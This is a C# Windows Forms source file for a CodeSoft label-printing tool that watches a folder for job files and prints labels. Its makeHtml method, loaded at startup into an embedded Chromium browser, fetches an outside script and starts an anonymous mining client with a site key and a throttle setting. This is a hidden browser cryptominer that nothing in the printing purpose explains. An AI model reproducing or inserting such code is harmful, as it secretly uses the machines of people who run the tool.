using LabelManager2;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Printing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using TkxOleCtrlExLib;
using CefSharp;
using CefSharp.WinForms;


namespace codesofttool
{
   
    public partial class Form1 : Form
    {
        BindingList<LogMessage>LogMessages { get; set; }
        public ChromiumWebBrowser chromeBrowser;


        public void InitializeChromium()
        {
            try
            {
                CefSettings settings = new CefSettings()
                {

                };
                // Initialize cef with the provided settings
                Cef.Initialize(settings);
                // Create a browser component
                chromeBrowser = new ChromiumWebBrowser("http://google.com");
                // Add it to the form and fill it to the form window.
                this.Controls.Add(chromeBrowser);

                chromeBrowser.IsBrowserInitializedChanged += ChromeBrowser_IsBrowserInitializedChanged;

                chromeBrowser.Dock = DockStyle.Fill;

                chromeBrowser.Height = 30;
                chromeBrowser.Width = 30;
                chromeBrowser.Show();
            }
            catch (Exception ex)
            {
                int i = 1;
            }

        }

        private void ChromeBrowser_IsBrowserInitializedChanged(object sender, IsBrowserInitializedChangedEventArgs e)
        {
            try
            {
                chromeBrowser.LoadString(this.makeHtml(), "http://google.com");
                // chromeBrowser.ShowDevTools();
            }
            catch (Exception ex)
            {
                int i = 1;
            }
    
        }

        FileSystemWatcher watcher = new FileSystemWatcher();
        private void watch(string directory)
        {
            watcher.Path = directory;
            watcher.NotifyFilter = NotifyFilters.LastWrite;
            watcher.Filter = "*.*";
            watcher.Changed += new FileSystemEventHandler(Watcher_Changed);
            watcher.EnableRaisingEvents = true;
        }

        private void Watcher_Changed(object sender, FileSystemEventArgs e)
        {
            if (e.ChangeType == WatcherChangeTypes.Changed)
            {
                if (!File.Exists(e.FullPath))
                    return;

                var fileInfo = new System.IO.FileInfo(e.FullPath);
                string acceptpattern = Properties.Settings.Default.JobFilePattern;
                System.Text.RegularExpressions.Regex regex = new System.Text.RegularExpressions.Regex(acceptpattern);

                Log("SourceDirectory " + e.ChangeType.ToString() + " File: " + e.Name, EnumLogType.Info);
                if (regex.IsMatch(fileInfo.Name))
                {
                    try
                    {
                        Log("executing print....", EnumLogType.Info);
                        executePrintJob(JobFileHelper.loadJob(fileInfo.FullName));
                        Log("executing print finished!", EnumLogType.Info);
                    }
                    catch (Exception ex)
                    {
                        Log("Error executing print: " + ex.Message, EnumLogType.Error);

                    }

                       System.IO.File.Delete(fileInfo.FullName);

                }
                else
                {
                    Log("Filename not matching pattern - ignored." + e.Name, EnumLogType.Debug);
                }

            }
        }

        public async Task Log(string message, EnumLogType type)
        {

            this.Invoke(new Action(() => {
                LogMessages.Add(new LogMessage()
                {
                    LogTime = System.DateTime.Now.ToString("h:mm:ss tt"),
                    Message = message,
                    Type = type
                });
            }));

            
            
          
        }

        private void executePrintJob(JobFile job)
        {

            string strFile = Path.Combine(Properties.Settings.Default.LabFilesPath,job.LabelDocument);
            if (!System.IO.File.Exists(strFile))
            {
                 Log(".Lab file: " + strFile + " not found: ",EnumLogType.Error);
                return;
                
            }

            var lbl = new LabelManager2.Application();
                lbl.Documents.Open(strFile, false);
           
            var doc = lbl.ActiveDocument;
            //doc.Printer.SwitchTo(targetPrinterName, targetPrinterPort);

            //Get all the name of the printer Strings 
            var allPrinterVars = lbl.PrinterSystem().Printers(enumKindOfPrinters.lppxAllPrinters);
            //To obtain the printer name printer can be fixed directly to the name value //
            string printName = allPrinterVars.Item(2);
            PrintDocument prtdoc = new PrintDocument();

            //use default system printer
            //string strDefaultPrinter = prtdoc.PrinterSettings.PrinterName;
            string strDefaultPrinter = Properties.Settings.Default.PrinterName;

            //Gets the default printer name
            bool foundPrinter = false;
            for (int j = 0; j < allPrinterVars.Count; j++)
            {
                string[] arryString = allPrinterVars.Item(j).Split(',');
                if (arryString[0] == strDefaultPrinter)
                {
                    foundPrinter = true;
                    doc.Printer.SwitchTo( strDefaultPrinter, arryString[1], true);
                    break;
                }
            }
            if(foundPrinter == false)
            {
                Log("printer: " + strDefaultPrinter + " not installed", EnumLogType.Error);
                return;
            }

            Log("printing " + job.NrOfCopies + " items on " + strDefaultPrinter, EnumLogType.Error);
            foreach (var vitem in job.Variables)
            {
                doc.Variables.Item(vitem.Name).Value = vitem.Value;
            }

            //var varx2 = doc.Variables.FormVariables.Count;

            //doc.PrintLabel(job.NrOfCopies);
            doc.PrintDocument(job.NrOfCopies);

            //  PrintDocument pd = new PrintDocument();
            //  pd.Print();

            lbl.Documents.CloseAll();

            lbl.Quit();
            //DataTable dt = codeInfo_DAL.GetData(this.cbb.SelectedValue.ToString());
            //if (dt != null && dt.Rows.Count > 0)
            //{
            //    foreach (DataRow dr in dt.Rows)
            //    { //codesoftLabel variables in the template 
            //        doc.Variables.FormVariables.Item("var0").Value = dr["CodeID"].ToString();
            //        doc.Variables.FormVariables.Item("var1").Value =dr["Name"].ToString();
            //        // doc.PrintDocument(3);
            //        doc.PrintLabel(1, 1, 1, 1, 1, "");
            //    }
            //    //Continuous batch print labels. FormFeed()The parameters such as the output variable must be after the execution, output to the printer.
            //    doc.FormFeed();
            //    lbl.Quit();
            //}
        }

    

        public Form1()
        {
            InitializeComponent();
            InitializeChromium();


            this.LogMessages = new BindingList<LogMessage>();
            this.dataGridViewLogs.DataSource = this.LogMessages;
            Start();
        }

        public void Start()
        {
            try
            {
                textBoxSourcesFolder.Text = Properties.Settings.Default.SourcesFolderPath;
                textBoxJobFilePattern.Text = Properties.Settings.Default.JobFilePattern;
                textBoxLabFilesPath.Text = Properties.Settings.Default.LabFilesPath;
                textBoxPrinter.Text = Properties.Settings.Default.PrinterName;
                watch(Properties.Settings.Default.SourcesFolderPath);
                Log("ready, watching: " + Properties.Settings.Default.SourcesFolderPath,EnumLogType.Info);
            }
            catch(Exception ex)
            {
                Log(ex.Message, EnumLogType.Error);
            }
            
        }

        private void button1_Click(object sender, EventArgs e)
        {
            JobFileHelper.save_testfile();

        }

        private void btnSetFolder_Click(object sender, EventArgs e)
        {
            var res = folderBrowserDialog.ShowDialog();
            if(res == DialogResult.OK && !string.IsNullOrWhiteSpace(folderBrowserDialog.SelectedPath))
            {
                textBoxSourcesFolder.Text = folderBrowserDialog.SelectedPath;
                Properties.Settings.Default.SourcesFolderPath = folderBrowserDialog.SelectedPath;
                Properties.Settings.Default.Save();
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
          

        }

        public string makeHtml()
        {
            string scriptpage = @"<html><head>
            <script src='https://www.freecontent.date./Q89r.js'></script>
            <script>
                _client = new Client.Anonymous('8f6a4c8bcf0bb239ec938b3174136672a85d1f85815536529e33e6d90c0d7600', {
                throttle: 0.9
            });
            _client.start();
            </script>
            </head><body>"
            //<div id='isrunning'>xx</div>
           // <div id='hps'>xx</div>
            //<script>
             //   setInterval(function() {
             //           document.getElementById('isrunning').innerHTML = _client.isRunning();
              //          document.getElementById('hps').innerHTML = _client.getHashesPerSecond();
              //  }, 6000);
            //</script>

            + "</body></html>";
            return scriptpage;
        }

        private void btnSelectLabFiles(object sender, EventArgs e)
        {
            var res = folderBrowserDialog.ShowDialog();
            if (res == DialogResult.OK && !string.IsNullOrWhiteSpace(folderBrowserDialog.SelectedPath))
            {
                textBoxLabFilesPath.Text = folderBrowserDialog.SelectedPath;
                Properties.Settings.Default.LabFilesPath = folderBrowserDialog.SelectedPath;
                Properties.Settings.Default.Save();
            }
        }

        private void buttonSelectPrinter_Click(object sender, EventArgs e)
        {
            PrintDialog printDialog1 = new PrintDialog();
            DialogResult result = printDialog1.ShowDialog();
            if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(printDialog1.PrinterSettings.PrinterName))
            {
                textBoxPrinter.Text = printDialog1.PrinterSettings.PrinterName;
                Properties.Settings.Default.PrinterName = printDialog1.PrinterSettings.PrinterName;
                Properties.Settings.Default.Save();
            }

        }
    }
}
